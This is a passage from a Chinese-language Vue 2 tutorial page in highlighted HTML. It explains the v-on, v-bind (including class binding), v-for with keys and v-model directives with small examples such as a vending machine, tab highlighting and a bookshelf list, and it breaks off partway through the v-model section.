class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">isShow</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      fn () &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 让提供的所有methods中的函数，this都指向当前实例</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// console.log(&#x27;执行了fn&#x27;, app.isShow)</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// console.log(app3 === this)</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">isShow</span> = !<span class="variable language_">this</span>.<span class="property">isShow</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-on调用传参"><a href="#v-on调用传参" class="headerlink" title="v-on调用传参"></a>v-on调用传参</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>小黑自动售货机<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;buy(5)&quot;</span>&gt;</span>可乐5元<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;buy(10)&quot;</span>&gt;</span>咖啡10元<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;buy(8)&quot;</span>&gt;</span>牛奶8元<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>银行卡余额：&#123;&#123; money &#125;&#125;元<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">money</span>: <span class="number">100</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      buy (price) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">money</span> -= price</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h2><ul><li><p>作用：动态的设置html的标签属性 -&gt; src url title …，将数据绑定到视图上；</p></li><li><p>语法：v-bind:属性名&#x3D;“表达式”；</p></li><li><p>简写：<code>v-bind:src=&quot;imgUrl&quot;</code>可以简写为<code>:src=&quot;imgUrl&quot;</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;imgUrl&quot;</span> <span class="attr">v-bind:title</span>=<span class="string">&quot;msg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;imgUrl&quot;</span> <span class="attr">:title</span>=<span class="string">&quot;msg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- v-bind:src   =&gt;   :src --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;imgUrl&quot;</span> <span class="attr">v-bind:title</span>=<span class="string">&quot;msg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;imgUrl&quot;</span> <span class="attr">:title</span>=<span class="string">&quot;msg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">imgUrl</span>: <span class="string">&#x27;./imgs/10-02.png&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">msg</span>: <span class="string">&#x27;hello 波仔&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-bind-操作-class"><a href="#v-bind-操作-class" class="headerlink" title="v-bind 操作 class"></a>v-bind 操作 class</h3><ul><li>说明：对于样式控制的增强，操作class；</li><li>语法：<code>:class=&quot;对象/数组&quot;</code><ul><li>对象：键就是类名，值就是布尔值。如果值为true，有这个类，否则没有这个类。适用于一个类名，来回切换的场景。</li><li>数组：数组中所有的类，都会添加到盒子中，本质上就是一个class列表。适用于批量添加或删除类的场景。</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border</span>: <span class="number">3px</span> solid <span class="number">#000</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.pink</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: pink;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.big</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;&#123; pink: true, big: true &#125;&quot;</span>&gt;</span>黑马程序员<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;[&#x27;pink&#x27;, &#x27;big&#x27;]&quot;</span>&gt;</span>黑马程序员<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Eg：tab栏点击即高亮的功能实现</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    * &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">ul</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#e01222</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">line-height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">list-style</span>: none;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">li</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>: <span class="number">#333333</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">li</span> <span class="selector-tag">a</span><span class="selector-class">.active</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="number">#e01222</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in list&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;activeIndex = index&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">:class</span>=<span class="string">&quot;&#123; active: index === activeIndex &#125;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">activeIndex</span>: <span class="number">2</span>, <span class="comment">// 记录高亮</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">list</span>: [</span></span><br><span class="line"><span class="language-javascript">          &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;京东秒杀&#x27;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">          &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;每日特价&#x27;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">          &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;品类秒杀&#x27;</span> &#125;</span></span><br><span class="line"><span class="language-javascript">        ]</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h2><ul><li>作用：基于数据循环，多次渲染整个元素 -&gt; 数组、对象、数字…；</li><li>语法：<code>v-for=&quot;(item, index) in 数组&quot;</code>，item是数组的每一项。index是下标；</li><li>简写：省略index：<code>v-for=&quot;item in 数组&quot;</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>小黑水果店<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in list&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123; item &#125;&#125; - &#123;&#123; index &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in list&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123; item &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">list</span>: [<span class="string">&#x27;西瓜&#x27;</span>, <span class="string">&#x27;苹果&#x27;</span>, <span class="string">&#x27;鸭梨&#x27;</span>, <span class="string">&#x27;榴莲&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="v-for-中的-Key"><a href="#v-for-中的-Key" class="headerlink" title="v-for 中的 Key"></a>v-for 中的 Key</h3><ul><li>语法：key属性 &#x3D; “唯一标识”；</li><li>作用：给列表项添加的<strong>唯一标识</strong>，便于Vue进行列表项的正确排序复用；</li><li>注意点：<ul><li>key的值只能是字符串或数字类型；</li><li>key的值必须具有唯一性；</li><li>推荐使用id作为key（唯一），不推荐使用index作为key（index会动态变化）。</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>小黑的书架<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item, index) in booksList&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.author &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;del(item.id)&quot;</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">booksList</span>: [</span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;《红楼梦》&#x27;</span>, <span class="attr">author</span>: <span class="string">&#x27;曹雪芹&#x27;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;《西游记》&#x27;</span>, <span class="attr">author</span>: <span class="string">&#x27;吴承恩&#x27;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;《水浒传》&#x27;</span>, <span class="attr">author</span>: <span class="string">&#x27;施耐庵&#x27;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        &#123; <span class="attr">id</span>: <span class="number">4</span>, <span class="attr">name</span>: <span class="string">&#x27;《三国演义》&#x27;</span>, <span class="attr">author</span>: <span class="string">&#x27;罗贯中&#x27;</span> &#125;</span></span><br><span class="line"><span class="language-javascript">      ]</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      del (id) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">this</span>.<span class="property">booksList</span> = <span class="variable language_">this</span>.<span class="property">booksList</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">id</span> !== id)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h2><ul><li>作用：给表单元素使用，双向绑定 -&gt; 可以快速获取或设置表单元素的内容<ul><li>数据变化 -&gt; 视图自动更新；</li><li>视图变化 -&gt; 数据自动更新；</li></ul></li><li>语法：v-model&#x3D;’变量’;</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">    v-model 可以让数据和视图，形成双向数据绑定</span></span><br><span class="line"><span class="comment">    (1) 数据变化，视图自动更新</span></span><br><span class="line"><span class="comment">    (2) 视图变化，数据自动更新</span></span><br><span class="line"><span class="comment">    可以快速[获取]或[设置]表单元素的内容</span></span><br><span class="line"><span class="comment">   --&gt;</span></span><br><span class="line">  账户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;username&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  密码：<span 